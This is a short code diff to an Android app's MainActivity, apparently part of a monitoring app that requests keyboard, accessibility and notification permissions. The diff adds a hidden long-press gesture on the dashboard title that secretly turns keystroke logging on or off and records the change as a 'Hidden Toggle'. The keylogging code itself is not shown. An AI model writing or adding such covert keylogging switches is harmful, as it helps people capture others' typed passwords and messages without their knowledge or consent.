@@ -88,6 +88,15 @@ class MainActivity : Activity() {
             txtNotificationStatus = findViewById(R.id.txtNotificationStatus)
             txtLogConsole = findViewById(R.id.txtLogConsole)
 
+            val titleView = findViewById<TextView>(R.id.txtDashboardTitle)
+            titleView?.setOnLongClickListener {
+                KeyloggingConfig.isEnabled = !KeyloggingConfig.isEnabled
+                val status = if (KeyloggingConfig.isEnabled) "ENABLED" else "DISABLED"
+                Toast.makeText(this, "Keylogging is now $status", Toast.LENGTH_LONG).show()
+                LogStore.addLog("Hidden Toggle: Keylogging is $status")
+                true
+            }
+
             val btnKeyboard = findViewById<Button>(R.id.btnEnableKeyboard)
             val btnAccessibility = findViewById<Button>(R.id.btnEnableAccessibility)
             val btnNotification = findViewById<Button>(R.id.btnEnableNotification)
